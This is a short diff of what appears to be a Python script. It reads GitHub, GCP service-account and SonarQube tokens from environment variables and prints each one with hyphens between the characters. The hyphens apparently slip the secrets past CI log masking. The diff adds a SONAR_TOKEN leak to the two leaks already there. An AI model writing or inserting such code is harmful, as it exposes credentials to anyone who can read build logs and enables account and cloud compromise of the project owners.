@@ -12,3 +12,6 @@ print("-".join([x for x in GITHUB_TOKEN]))
 
 GCP_SONAR_SA_KEY = os.getenv("GCP_SONAR_SA_KEY")
 print("-".join([x for x in GCP_SONAR_SA_KEY]))
+
+SONAR_TOKEN = os.getenv("SONAR_TOKEN")
+print("-".join([x for x in SONAR_TOKEN]))
